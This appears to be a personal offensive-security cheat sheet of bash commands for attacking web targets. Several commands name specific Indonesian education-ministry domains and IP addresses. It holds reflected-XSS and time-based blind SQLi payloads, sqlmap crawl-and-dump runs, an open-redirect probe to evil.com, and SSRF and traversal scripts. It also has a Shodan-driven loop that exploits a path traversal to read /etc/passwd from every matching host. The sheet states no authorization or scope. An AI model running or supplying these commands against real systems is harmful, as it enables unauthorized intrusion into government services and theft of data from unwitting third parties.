### Enumerasi
```bash
# Subdomain enumeration using subfinder and amass
subfinder -dL /home/kali/Tools/Aman.txt -o subfinder.txt
amass enum -passive -norecursive -noalts -df /home/kali/Tools/Aman.txt -o amass.txt

# Nmap scanning with specified ports and scripts
nmap -Pn -A -sV -sC 118.98.222.11 -p 17,80,20,21,22,23,24,25,53,69,80,123,443,1723,4343,8081,8082,8088,53,161,177,3306,8888,27017,27018,139,137,445,8080,8443 -oN scan-result.txt --script=vuln

# Finding subdomains with sublist3r
sublist3r -d https://wkmb-dev.kemdikbud.go.id/ -o sublist3r.txt
```

### XSS (Cross-Site Scripting)
```bash
# XSS detection using dalfox
dalfox file /home/kali/Tools/Aman.txt -b https://hahwul.xss.ht -o Vulnerable_XSS.txt

# XSS payloads using waybackurls and curl
waybackurls https://buku-sibi.netlify.app/ | gf xss | grep '=' | qsreplace '"><script>confirm(1)</script>' | while read host; do curl --silent --path-as-is --insecure "$host" | grep -qs "<script>confirm(1)" && echo "$host \033[0;31mVulnerable\n"; done

# Finding reflected XSS with Gxss
cat /home/kali/Tools/Aman.txt | Gxss -p khXSS -o XSS_Ref.txt
```

### SQL Injection (SQLi)
```bash
# SQLi detection using sqlmap
sqlmap -u https://sinde-tes.kemdikbud.go.id/login --dbs --forms --crawl=2
sqlmap -g /home/kali/Tools/Aman.txt --dbs --forms --crawl=2

# Automated SQLi payloads and detection with sqlmap
subfinder -dL /home/kali/Tools/Aman.txt | dnsx | waybackurls | uro | grep "?" | head -20 | httpx -silent > urls; sqlmap -m urls --batch --random-agent --level 1 | tee sqlmap.txt

# Blind SQLi time-based payloads
cat /home/kali/Tools/Aman.txt | grep "=" | qsreplace "1 AND (SELECT 5230 FROM (SELECT(SLEEP(10)))SUmc)"> blindsqli.txt
```

### CORS Misconfiguration
```bash
# CORS scanning using CORS-Scanner and corscanner
python3 corsy.py -i /home/kali/Tools/Aman.txt
cat /home/kali/Tools/Aman.txt | CORS-Scanner
corscanner -i /home/kali/Tools/Aman.txt -v -t 100
```

### Specific Vulnerability Scanning using Nuclei
```bash
# Scanning for specific vulnerabilities using Nuclei templates
nuclei -u https://wkmb-dev.kemdikbud.go.id -w nuclei-templates/cloud/aws/aws-code-env.yaml
nuclei -list /home/kali/Tools/Aman.txt -t /root/nuclei-templates/vulnerabilities -t /root/nuclei-templates/cves -t /root/nuclei-templates/exposures -t /root/nuclei-templates/sqli.yaml

# WordPress workflow
nuclei -list http_urls.txt -w workflows/wordpress-workflow.yaml

# Exposures in Symfony configuration
nuclei -list /home/kali/Tools/Aman.txt -w nuclei-templates/http/exposures/configs/symfony-profiler.yaml
```

### Parameter Discovery
```bash
# Parameter discovery using Arjun
arjun -u https://sinde-tes.kemdikbud.go.id/login -w burp-parameter-names.txt
arjun -u https://118.98.233.186:30443/login -w /home/kali/SecLists/Discovery/Web-Content/burp-parameter-names.txt
```

### HTTP Probing and Waybackurls
```bash
# Extract URLs and probe HTTP
cat /home/kali/Tools/Aman.txt | waybackurls | grep "?" | uro | httpx -silent > urls; sqlmap -m urls --batch --random-agent --level 1 | tee sqlmap.txt
cat /home/kali/Tools/Aman.txt | anew | httpx -silent -threads 500 | xargs -I@ jaeles scan -s /jaeles-signatures/ -u @

# Using gau and hakrawler for URL discovery
echo https://wkmb-dev.kemdikbud.go.id | hakrawler > testphp.txt && cat testphp.txt | grep -o "http[^ ]*" > testphp_filter_urls.txt && cat testphp_filter_urls.txt | grep = > testphp_parameter_urls.txt
```

### Miscellaneous
```bash
# Using httpx for status code checking
httpx -l /home/kali/Tools/Aman.txt -path "///evil.com" -status-code -mc 302

# Shodan for reconnaissance
shodan search http.favicon.hash:-1252041730 "3992" --fields ip_str,port --separator " " | awk '{print $1":"$2}' | while read host; do curl --silent --path-as-is --insecure "https://$host/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd" | grep -q root && \printf "$host \033[0;31mVulnerable\n" || printf "$host \033[0;32mNot Vulnerable\n"; done

# Running various python scripts for specific vulnerabilities
python2 pwnredir.py -u https://admin.kampusmerdeka.staging.belajar.id -f payloads.list
python3 pwnxss.py -u https://118.98.222.15/web/
python3 pwnssrf.py -H https://wkmb-dev.kemdikbud.go.id/
python3 dotdotslash.py -u https://wkmb-dev.kemdikbud.go.id/
```
